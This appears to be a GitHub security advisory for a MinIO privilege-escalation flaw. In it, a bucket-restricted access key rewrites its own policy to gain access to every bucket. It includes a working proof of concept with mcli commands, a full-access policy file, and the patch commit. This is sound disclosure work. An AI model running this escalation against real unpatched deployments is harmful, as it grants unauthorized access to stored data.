# Implicit allow for Access keys to inherit `admin:UpdateServiceAccount` allows for privilege escalation

## Description

### Summary

When someone creates an access key, it inherits the permissions of the parent key. Not only for

`s3:*` actions, but also `admin:*` actions. Which means unless somewhere above in the

access-key hierarchy, the `admin` rights are denied, access keys will be able to simply

override their own `s3` permissions to something more permissive.

Credit to [@xSke](https://github.com/xSke) for sort of accidentally discovering this. I only understood the implications.

### Details / PoC

We spun up the latest version of minio in a docker container and signed in to the admin UI

using the minio root user. We created two buckets, `public` and `private` and created an

access key called `mycat` and attached the following policy to only allow access to the

bucket called `public`.

```
{
 "Version": "2012-10-17",
 "Statement": [
  {
   "Effect": "Allow",
   "Action": [
    "s3:*"
   ],
   "Resource": [
    "arn:aws:s3:::public",
    "arn:aws:s3:::public/*"
   ]
  }
 ]
}
```

We then set an alias in mc: `mcli alias set vuln http://localhost:9001 mycat mycatiscute`

And checked whether policy works:

```
A ~/c/minio-vuln mcli ls vuln
[0001-01-01 00:53:28 LMT]     0B public/

```

Looks good, we believe this is how 99% of users will work with access policies.

If I now create a file `full-access-policy.json`:

```
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": [
        "s3:*"
      ],
      "Resource": [
        "arn:aws:s3:::*"
      ]
    }
  ]
}
```

And then:

```
A ~/c/minio-vuln mcli admin user svcacct edit --policy full-access-policy.json vuln mycat
Edited service account `mycat` successfully.
```

`mycat` has escalated its privileges to get access to the entire deployment:

```
A ~/c/minio-vuln mcli ls vuln
[0001-01-01 00:53:28 LMT]     0B private/
[0001-01-01 00:53:28 LMT]     0B public/
```
### Impact

A trivial privilege escalation unless the operator fully understands that they need to

explicitly deny `admin` actions on access keys.

### Patched

```
commit 0ae4915a9391ef4b3ec80f5fcdcf24ee6884e776 (HEAD -> master, origin/master)
Author: Aditya Manthramurthy <donatello@users.noreply.github.com>
Date:   Wed Jan 31 10:56:45 2024 -0800

    fix: permission checks for editing access keys (#18928)

    With this change, only a user with `UpdateServiceAccountAdminAction`
    permission is able to edit access keys.

    We would like to let a user edit their own access keys, however the
    feature needs to be re-designed for better security and integration with
    external systems like AD/LDAP and OpenID.

    This change prevents privilege escalation via service accounts.

```

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

fix: permission checks for editing access keys ([#18928](https://github.com/minio/minio/pull/18928))

```
With this change, only a user with `UpdateServiceAccountAdminAction`
permission is able to edit access keys.

We would like to let a user edit their own access keys, however the
feature needs to be re-designed for better security and integration with
external systems like AD/LDAP and OpenID.

This change prevents privilege escalation via service accounts.
```
